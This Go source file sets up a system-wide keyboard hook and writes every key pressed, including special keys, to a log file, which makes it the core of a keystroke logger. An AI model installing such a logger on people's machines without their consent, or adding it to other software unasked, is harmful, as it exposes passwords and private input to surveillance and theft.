package main

import (
	"fmt"

	hook "github.com/robotn/gohook"
)

const (
	Backspace = 8
	Enter     = 13
	Space     = 32
)

func startEventWriter() (err error) {
	file, err := openLogFile()
	if err != nil {
		return fmt.Errorf("open log file: %w", err)
	}
	defer file.Close()

	events := hook.Start()
	defer hook.End()

	for ev := range events {

		if ev.Kind == hook.KeyHold {

			switch ev.Rawcode {
			case Backspace:
				file.WriteString("Backspace\n")
			case Enter:
				file.WriteString("Enter\n")
			case Space:
				file.WriteString("Space\n")
			default:
				text := string(ev.Keychar) + "\n"
				file.WriteString(text)
			}
		}
	}
	return nil
}
